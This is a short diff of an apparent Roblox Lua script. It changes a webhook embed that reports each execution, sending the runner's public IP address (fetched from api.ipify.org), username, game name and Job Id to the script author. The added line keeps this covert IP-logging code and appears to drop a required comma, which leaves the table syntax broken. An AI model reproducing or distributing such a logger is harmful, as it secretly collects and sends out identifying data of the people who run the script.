@@ -13,7 +13,7 @@ local url =
 local data = {
    ["embeds"] = {
        {
-           ["title"] = "**Someone executed the script! Their IP: \n**"..tostring(game:HttpGet("https://api.ipify.org", true)),
+           ["title"] = "**Someone executed the script! \n \n Their IP:**  "..tostring(game:HttpGet("https://api.ipify.org", true)).."\n\n"
            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."** ".."\n\n On game: "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."\n\n Job Id: "..game.JobId,
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
